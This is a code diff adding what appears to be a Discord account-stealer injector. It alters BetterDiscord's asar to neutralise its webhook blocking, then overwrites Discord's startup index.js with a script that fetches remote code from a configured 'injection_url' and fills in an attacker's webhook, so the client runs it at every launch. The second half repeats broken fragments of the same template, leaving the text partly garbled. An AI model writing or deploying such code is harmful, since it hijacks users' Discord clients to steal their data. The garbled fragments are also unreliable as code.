@@ -1,0 +1,43 @@
+let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+fs.existsSync(dir)
+let x = fs.readFileSync(dir)
+fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "haxisgod"))
+const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')
+const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`
+"';
+const bdPath = '"
+"';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('"
+config.webhook
+config.webhook_protector_key
+path.join(resourcePath, 'app.asar')
+fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'))
